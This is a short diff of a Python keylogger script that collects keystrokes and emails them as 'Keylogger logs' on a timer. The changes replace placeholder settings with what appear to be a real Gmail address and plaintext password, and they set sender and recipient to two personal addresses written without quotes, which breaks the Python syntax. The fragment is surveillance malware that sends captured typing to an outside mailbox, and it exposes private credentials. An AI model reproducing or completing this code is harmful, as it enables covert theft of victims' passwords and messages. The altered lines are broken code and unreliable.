@@ -7,8 +7,8 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
 SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
-EMAIL_ADDRESS = "email@provider.tld"
-EMAIL_PASSWORD = "password_here"
+EMAIL_ADDRESS = "carloscabrine7@gmail.com"
+EMAIL_PASSWORD = "Perrodemierda11@@"
 
 class Keylogger:
     def __init__(self, interval, report_method="email"):
@@ -66,8 +66,8 @@ class Keylogger:
         It creates an HTML version as well as text version
         to be sent as an email"""
         msg = MIMEMultipart("alternative")
-        msg["From"] = EMAIL_ADDRESS
-        msg["To"] = EMAIL_ADDRESS
+        msg["From"] = davidpapa726@gmail.com
+        msg["To"] = carloscabrine7@gmail.com
         msg["Subject"] = "Keylogger logs"
         # simple paragraph, feel free to edit
         html = f"<p>{message}</p>"
